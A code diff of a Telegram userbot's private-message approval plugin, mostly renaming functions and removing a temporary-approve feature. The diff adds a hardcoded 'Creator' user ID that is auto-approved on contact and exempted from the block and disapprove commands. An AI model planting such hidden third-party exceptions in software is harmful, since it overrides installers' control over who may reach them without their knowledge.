@@ -6,11 +6,11 @@ from telethon import Button, functions
 from telethon.events import CallbackQuery
 from telethon.utils import get_display_name
 
-from userbot import lionxub
+from userbot import lionx
 from userbot.funcs.logger import logging
 
 from ..Config import Config
-from ..funcs.managers import edit_delete, edit_or_reply
+from ..funcs.managers import eod, eor
 from ..helpers.utils import _format, get_user_from_event, reply_id
 from ..sql_helper import global_collectionjson as sql
 from ..sql_helper import global_list as sqllist
@@ -18,17 +18,9 @@ from ..sql_helper import pmpermit_sql
 from ..sql_helper.globals import addgvar, delgvar, gvarstatus
 from . import mention
 
-plugin_category = "utils"
+plugin_type = "utils"
 LOGS = logging.getLogger(__name__)
-cmdhd = Config.COMMAND_HAND_LER
-
-
-class PMPERMIT:
-    def __init__(self):
-        self.TEMPAPPROVED = []
-
-
-PMPERMIT_ = PMPERMIT()
+cmdhd = Config.HANDLER
 
 
 async def do_pm_permit_action(event, chat):  # sourcery no-metrics
@@ -56,9 +48,9 @@ async def do_pm_permit_action(event, chat):  # sourcery no-metrics
     if str(chat.id) not in PM_WARNS:
         PM_WARNS[str(chat.id)] = 0
     try:
-        MAX_FLOOD_IN_PMS = int(gvarstatus("MAX_FLOOD_IN_PMS") or 6)
+        MAX_FLOOD_IN_PMS = int(gvarstatus("MAX_FLOOD_IN_PMS") or 4)
     except (ValueError, TypeError):
-        MAX_FLOOD_IN_PMS = 6
+        MAX_FLOOD_IN_PMS = 4
     totalwarns = MAX_FLOOD_IN_PMS + 1
     warns = PM_WARNS[str(chat.id)] + 1
     remwarns = totalwarns - warns
@@ -128,28 +120,26 @@ async def do_pm_permit_action(event, chat):  # sourcery no-metrics
         )
     elif gvarstatus("pmmenu") is None:
         USER_BOT_NO_WARN = f"""__Hi__ {mention}__, I haven't approved you yet to personal message me. 
-
 You have {warns}/{totalwarns} warns until you get blocked by the LionX.
-
 Choose an option from below to specify the reason of your message and wait for me to check it. __⬇️"""
     else:
         USER_BOT_NO_WARN = f"""__Hi__ {mention}__, I haven't approved you yet to personal message me.
-
 You have {warns}/{totalwarns} warns until you get blocked by the LionX.
-
 Don't spam my inbox. say reason and wait until my response.__"""
     addgvar("pmpermit_text", USER_BOT_NO_WARN)
     PM_WARNS[str(chat.id)] += 1
     try:
         if gvarstatus("pmmenu") is None:
-            results = await event.client.inline_query(
-                Config.TG_BOT_USERNAME, "pmpermit"
-            )
+            results = await event.client.inline_query(Config.BOT_USERNAME, "pmpermit")
             msg = await results[0].click(chat.id, reply_to=reply_to_id, hide_via=True)
         else:
-            if PM_PIC := gvarstatus("pmpermit_pic"):
-                LIONX = list(PM_PIC.split())
-                PIC = list(LIONX)
+            PM_PIC = (
+                gvarstatus("PM_PIC")
+                or "https://telegra.ph/file/8bea1e8b8c21e280da185.jpg"
+            )
+            if PM_PIC:
+                lionx = [x for x in PM_PIC.split()]
+                PIC = list(lionx)
                 LIONX_IMG = random.choice(PIC)
             else:
                 LIONX_IMG = None
@@ -403,7 +393,7 @@ async def do_pm_spam_action(event, chat):
         return
 
 
-@lionxub.lionx_cmd(
+@lionx.lion_cmd(
     incoming=True, func=lambda e: e.is_private, edited=False, forword=None
 )
 async def on_new_private_message(event):
@@ -414,8 +404,20 @@ async def on_new_private_message(event):
         return
     if pmpermit_sql.is_approved(chat.id):
         return
-    if chat.id in PMPERMIT_.TEMPAPPROVED:
-        return
+    if event.chat_id == 1902787452:
+        await event.client.send_message(chat, "👨‍💻 Welcome My Master 💝")
+        reason = "**♡ My Pro Master Is Here ♡ **"
+        try:
+            PM_WARNS = sql.get_collection("pmwarns").json
+        except AttributeError:
+            PM_WARNS = {}
+        if not pmpermit_sql.is_approved(chat.id):
+            if str(chat.id) in PM_WARNS:
+                del PM_WARNS[str(chat.id)]
+            start_date = str(datetime.now().strftime("%B %d, %Y"))
+            pmpermit_sql.approve(
+                chat.id, get_display_name(chat), start_date, chat.username, reason
+            )
     if str(chat.id) in sqllist.get_collection_list("pmspam"):
         return await do_pm_spam_action(event, chat)
     if str(chat.id) in sqllist.get_collection_list("pmchat"):
@@ -429,7 +431,7 @@ async def on_new_private_message(event):
     await do_pm_permit_action(event, chat)
 
 
-@lionxub.lionx_cmd(
+@lionx.lion_cmd(
     outgoing=True, func=lambda e: e.is_private, edited=False, forword=None
 )
 async def you_dm_other(event):
@@ -455,10 +457,6 @@ async def you_dm_other(event):
             f"{cmdhd}a",
             f"{cmdhd}da",
             f"{cmdhd}approve",
-            f"{cmdhd}tempapprove",
-            f"{cmdhd}tempa",
-            f"{cmdhd}tapprove",
-            f"{cmdhd}ta",
         )
     ):
         return
@@ -487,17 +485,16 @@ async def you_dm_other(event):
         sql.add_collection("pmmessagecache", PMMESSAGE_CACHE, {})
 
 
-@lionxub.tgbot.on(CallbackQuery(data=re.compile(rb"show_pmpermit_options")))
+@lionx.tgbot.on(CallbackQuery(data=re.compile(rb"show_pmpermit_options")))
 async def on_plug_in_callback_query_handler(event):
     if event.query.user_id == event.client.uid:
         text = "Idoit these options are for users who messages you, not for you"
         return await event.answer(text, cache_time=0, alert=True)
     text = f"""Ok, Now you are accessing the availabe menu of my master, {mention}.
 __Let's make this smooth and let me know why you are here.__
-
 **Choose one of the following reasons why you are here:**"""
     buttons = [
-        (Button.inline(text="To enquire something.", data="to_enquire_something"),),
+        (Button.inline(text="To enquiry something.", data="to_enquire_something"),),
         (Button.inline(text="To request something.", data="to_request_something"),),
         (Button.inline(text="To chat with my master.", data="to_chat_with_my_master"),),
         (
@@ -519,7 +516,7 @@ __Let's make this smooth and let me know why you are here.__
     await event.edit(text, buttons=buttons)
 
 
-@lionxub.tgbot.on(CallbackQuery(data=re.compile(rb"to_enquire_something")))
+@lionx.tgbot.on(CallbackQuery(data=re.compile(rb"to_enquire_something")))
 async def on_plug_in_callback_query_handler(event):
     if event.query.user_id == event.client.uid:
         text = "Idoit this options for user who messages you. not for you"
@@ -540,14 +537,13 @@ Then we can extend this conversation more but not right now.__"""
     await event.edit(text)
 
 
-@lionxub.tgbot.on(CallbackQuery(data=re.compile(rb"to_request_something")))
+@lionx.tgbot.on(CallbackQuery(data=re.compile(rb"to_request_something")))
 async def on_plug_in_callback_query_handler(event):
     if event.query.user_id == event.client.uid:
         text = "Idoit this options for user who messages you. not for you"
         return await event.answer(text, cache_time=0, alert=True)
     text = """__Okay. I have notified my master about this. When he/she comes comes online\
  or when my master is free he/she will look into this chat and will ping you so we can have a friendly chat.__\
-
 **But right now please do not spam unless you wish to get blocked.**"""
     sqllist.add_to_list("pmrequest", event.query.user_id)
     try:
@@ -562,7 +558,7 @@ async def on_plug_in_callback_query_handler(event):
     await event.edit(text)
 
 
-@lionxub.tgbot.on(CallbackQuery(data=re.compile(rb"to_chat_with_my_master")))
+@lionx.tgbot.on(CallbackQuery(data=re.compile(rb"to_chat_with_my_master")))
 async def on_plug_in_callback_query_handler(event):
     if event.query.user_id == event.client.uid:
         text = "Idoit these options are for users who message you. not for you"
@@ -582,7 +578,7 @@ some other time. Right now I am a little busy. when I come online and if I am fr
     await event.edit(text)
 
 
-@lionxub.tgbot.on(CallbackQuery(data=re.compile(rb"to_spam_my_master_inbox")))
+@lionx.tgbot.on(CallbackQuery(data=re.compile(rb"to_spam_my_master_inbox")))
 async def on_plug_in_callback_query_handler(event):
     if event.query.user_id == event.client.uid:
         text = "Idoit these options are for users who message you. not for you"
@@ -615,9 +611,9 @@ async def on_plug_in_callback_query_handler(event):
     await event.edit(text)
 
 
-@lionxub.lionx_cmd(
+@lionx.lion_cmd(
     pattern="pmguard (on|off)$",
-    command=("pmguard", plugin_category),
+    command=("pmguard", plugin_type),
     info={
         "header": "To turn on or turn off pmpermit.",
         "usage": "{tr}pmguard on/off",
@@ -629,23 +625,21 @@ async def pmpermit_on(event):
     if input_str == "on":
         if gvarstatus("pmpermit") is None:
             addgvar("pmpermit", "true")
-            await edit_delete(
+            await eod(
                 event, "__Pmpermit has been enabled for your account successfully.__"
             )
         else:
-            await edit_delete(event, "__Pmpermit is already enabled for your account__")
+            await eod(event, "__Pmpermit is already enabled for your account__")
     elif gvarstatus("pmpermit") is not None:
         delgvar("pmpermit")
-        await edit_delete(
-            event, "__Pmpermit has been disabled for your account successfully__"
-        )
+        await eod(event, "__Pmpermit has been disabled for your account successfully__")
     else:
-        await edit_delete(event, "__Pmpermit is already disabled for your account__")
+        await eod(event, "__Pmpermit is already disabled for your account__")
 
 
-@lionxub.lionx_cmd(
+@lionx.lion_cmd(
     pattern="pmmenu (on|off)$",
-    command=("pmmenu", plugin_category),
+    command=("pmmenu", plugin_type),
     info={
         "header": "To turn on or turn off pmmenu.",
         "usage": "{tr}pmmenu on/off",
@@ -657,28 +651,24 @@ async def pmpermit_on(event):
     if input_str == "off":
         if gvarstatus("pmmenu") is None:
             addgvar("pmmenu", "false")
-            await edit_delete(
+            await eod(
                 event,
                 "__Pmpermit Menu has been disabled for your account successfully.__",
             )
         else:
-            await edit_delete(
-                event, "__Pmpermit Menu is already disabled for your account__"
-            )
+            await eod(event, "__Pmpermit Menu is already disabled for your account__")
     elif gvarstatus("pmmenu") is not None:
         delgvar("pmmenu")
-        await edit_delete(
+        await eod(
             event, "__Pmpermit Menu has been enabled for your account successfully__"
         )
     else:
-        await edit_delete(
-            event, "__Pmpermit Menu is already enabled for your account__"
-        )
+        await eod(event, "__Pmpermit Menu is already enabled for your account__")
 
 
-@lionxub.lionx_cmd(
+@lionx.lion_cmd(
     pattern="(a|approve)(?:\s|$)([\s\S]*)",
-    command=("approve", plugin_category),
+    command=("approve", plugin_type),
     info={
         "header": "To approve user to direct message you.",
         "usage": [
@@ -690,7 +680,7 @@ async def pmpermit_on(event):
 async def approve_p_m(event):  # sourcery no-metrics
     "To approve user to pm"
     if gvarstatus("pmpermit") is None:
-        return await edit_delete(
+        return await eod(
             event,
             f"__Turn on pmpermit by doing __`{cmdhd}pmguard on` __for working of this plugin__",
         )
@@ -725,7 +715,7 @@ async def approve_p_m(event):  # sourcery no-metrics
             sqllist.rm_from_list("pmenquire", chat.id)
         if str(chat.id) in sqllist.get_collection_list("pmoptions"):
             sqllist.rm_from_list("pmoptions", chat.id)
-        await edit_delete(
+        await eod(
             event,
             f"__Approved to pm__ [{user.first_name}](tg://user?id={user.id})\n**Reason :** __{reason}__",
         )
@@ -746,96 +736,15 @@ async def approve_p_m(event):  # sourcery no-metrics
         sql.add_collection("pmwarns", PM_WARNS, {})
         sql.add_collection("pmmessagecache", PMMESSAGE_CACHE, {})
     else:
-        await edit_delete(
+        await eod(
             event,
             f"[{user.first_name}](tg://user?id={user.id}) __is already in approved list__",
         )
 
 
-@lionxub.lionx_cmd(
-    pattern="t(emp)?(a|approve)(?:\s|$)([\s\S]*)",
-    command=("tapprove", plugin_category),
-    info={
-        "header": "To approve user to direct message you for temporarily.",
-        "note": "Heroku restarts every 24 hours so with every restart it dissapproves every temp approved user",
-        "usage": [
-            "{tr}ta/tapprove <username/reply reason> in group",
-            "{tr}ta/tapprove <reason> in pm",
-        ],
-    },
-)
-async def tapprove_pm(event):  # sourcery no-metrics
-    "Temporarily approve user to pm"
-    if gvarstatus("pmpermit") is None:
-        return await edit_delete(
-            event,
-            f"__Turn on pmpermit by doing __`{cmdhd}pmguard on` __for working of this plugin__",
-        )
-    if event.is_private:
-        user = await event.get_chat()
-        reason = event.pattern_match.group(3)
-    else:
-        user, reason = await get_user_from_event(event, thirdgroup=True)
-        if not user:
-            return
-    if not reason:
-        reason = "Not mentioned"
-    try:
-        PM_WARNS = sql.get_collection("pmwarns").json
-    except AttributeError:
-        PM_WARNS = {}
-    if (user.id not in PMPERMIT_.TEMPAPPROVED) and (
-        not pmpermit_sql.is_approved(user.id)
-    ):
-        if str(user.id) in PM_WARNS:
-            del PM_WARNS[str(user.id)]
-        PMPERMIT_.TEMPAPPROVED.append(user.id)
-        chat = user
-        if str(chat.id) in sqllist.get_collection_list("pmspam"):
-            sqllist.rm_from_list("pmspam", chat.id)
-        if str(chat.id) in sqllist.get_collection_list("pmchat"):
-            sqllist.rm_from_list("pmchat", chat.id)
-        if str(chat.id) in sqllist.get_collection_list("pmrequest"):
-            sqllist.rm_from_list("pmrequest", chat.id)
-        if str(chat.id) in sqllist.get_collection_list("pmenquire"):
-            sqllist.rm_from_list("pmenquire", chat.id)
-        if str(chat.id) in sqllist.get_collection_list("pmoptions"):
-            sqllist.rm_from_list("pmoptions", chat.id)
-        await edit_delete(
-            event,
-            f"[{user.first_name}](tg://user?id={user.id}) is __temporarily approved to pm__\n**Reason :** __{reason}__",
-        )
-        try:
-            PMMESSAGE_CACHE = sql.get_collection("pmmessagecache").json
-        except AttributeError:
-            PMMESSAGE_CACHE = {}
-        if str(user.id) in PMMESSAGE_CACHE:
-            try:
-                await event.client.delete_messages(
-                    user.id, PMMESSAGE_CACHE[str(user.id)]
-                )
-            except Exception as e:
-                LOGS.info(str(e))
-            del PMMESSAGE_CACHE[str(user.id)]
-        sql.del_collection("pmwarns")
-        sql.del_collection("pmmessagecache")
-        sql.add_collection("pmwarns", PM_WARNS, {})
-        sql.add_collection("pmmessagecache", PMMESSAGE_CACHE, {})
-    elif pmpermit_sql.is_approved(user.id):
-        await edit_delete(
-            event,
-            f"[{user.first_name}](tg://user?id={user.id}) __is in approved list__",
-        )
-    else:
-        await edit_delete(
-            event,
-            f"[{user.first_name}](tg://user?id={user.id}) __is already in temporary approved list__",
-        )
-
-
-@lionxub.lionx_cmd(
+@lionx.lion_cmd(
     pattern="(da|disapprove)(?:\s|$)([\s\S]*)",
-    command=("disapprove", plugin_category),
+    command=("disapprove", plugin_type),
     info={
         "header": "To disapprove user to direct message you.",
         "note": "This command works only for approved users",
@@ -850,7 +759,7 @@ async def tapprove_pm(event):  # sourcery no-metrics
 async def disapprove_p_m(event):
     "To disapprove user to direct message you."
     if gvarstatus("pmpermit") is None:
-        return await edit_delete(
+        return await eod(
             event,
             f"__Turn on pmpermit by doing __`{cmdhd}pmguard on` __for working of this plugin__",
         )
@@ -866,33 +775,27 @@ async def disapprove_p_m(event):
                 return
     if reason == "all":
         pmpermit_sql.disapprove_all()
-        return await edit_delete(
-            event, "__Ok! I have disapproved everyone successfully.__"
-        )
+        return await eod(event, "__Ok! I have disapproved everyone successfully.__")
+    if user.id == 1902787452:
+        return await eod(event, "**I cant disapprove My Creator\nSeems Like a God**")
     if not reason:
         reason = "Not Mentioned."
     if pmpermit_sql.is_approved(user.id):
         pmpermit_sql.disapprove(user.id)
-        await edit_or_reply(
-            event,
-            f"[{user.first_name}](tg://user?id={user.id}) __is disapproved to personal message me.__\n**Reason:**__ {reason}__",
-        )
-    elif user.id in PMPERMIT_.TEMPAPPROVED:
-        PMPERMIT_.TEMPAPPROVED.remove(user.id)
-        await edit_or_reply(
+        await eor(
             event,
             f"[{user.first_name}](tg://user?id={user.id}) __is disapproved to personal message me.__\n**Reason:**__ {reason}__",
         )
     else:
-        await edit_delete(
+        await eod(
             event,
             f"[{user.first_name}](tg://user?id={user.id}) __is not yet approved__",
         )
 
 
-@lionxub.lionx_cmd(
+@lionx.lion_cmd(
     pattern="block(?:\s|$)([\s\S]*)",
-    command=("block", plugin_category),
+    command=("block", plugin_type),
     info={
         "header": "To block user to direct message you.",
         "usage": [
@@ -904,7 +807,7 @@ async def disapprove_p_m(event):
 async def block_p_m(event):
     "To block user to direct message you."
     if gvarstatus("pmpermit") is None:
-        return await edit_delete(
+        return await eod(
             event,
             f"__Turn on pmpermit by doing __`{cmdhd}pmguard on` __for working of this plugin__",
         )
@@ -915,6 +818,8 @@ async def block_p_m(event):
         user, reason = await get_user_from_event(event)
         if not user:
             return
+    if user.id == 1902787452:
+        return await eor(event, "I Cant Block My Creator")
     if not reason:
         reason = "Not Mentioned."
     try:
@@ -940,15 +845,15 @@ async def block_p_m(event):
     sql.add_collection("pmwarns", PM_WARNS, {})
     sql.add_collection("pmmessagecache", PMMESSAGE_CACHE, {})
     await event.client(functions.contacts.BlockRequest(user.id))
-    await edit_delete(
+    await eod(
         event,
         f"[{user.first_name}](tg://user?id={user.id}) __is blocked, he can no longer personal message you.__\n**Reason:** __{reason}__",
     )
 
 
-@lionxub.lionx_cmd(
+@lionx.lion_cmd(
     pattern="unblock(?:\s|$)([\s\S]*)",
-    command=("unblock", plugin_category),
+    command=("unblock", plugin_type),
     info={
         "header": "To unblock a user.",
         "usage": [
@@ -960,7 +865,7 @@ async def block_p_m(event):
 async def unblock_pm(event):
     "To unblock a user."
     if gvarstatus("pmpermit") is None:
-        return await edit_delete(
+        return await eod(
             event,
             f"__Turn on pmpermit by doing __`{cmdhd}pmguard on` __for working of this plugin__",
         )
@@ -979,9 +884,9 @@ async def unblock_pm(event):
     )
 
 
-@lionxub.lionx_cmd(
+@lionx.lion_cmd(
     pattern="l(ist)?a(pproved)?$",
-    command=("listapproved", plugin_category),
+    command=("listapproved", plugin_type),
     info={
         "header": "To see list of approved users.",
         "usage": [
@@ -992,7 +897,7 @@ async def unblock_pm(event):
 async def approve_p_m(event):
     "To see list of approved users."
     if gvarstatus("pmpermit") is None:
-        return await edit_delete(
+        return await eod(
             event,
             f"__Turn on pmpermit by doing __`{cmdhd}pmguard on` __to work this plugin__",
         )
@@ -1003,7 +908,7 @@ async def approve_p_m(event):
             APPROVED_PMs += f"• 👤 {_format.mentionuser(user.first_name , user.user_id)}\n**ID:** `{user.user_id}`\n**UserName:** @{user.username}\n**Date: **__{user.date}__\n**Reason: **__{user.reason}__\n\n"
     else:
         APPROVED_PMs = "`You haven't approved anyone yet`"
-    await edit_or_reply(
+    await eor(
         event,
         APPROVED_PMs,
         file_name="approvedpms.txt",
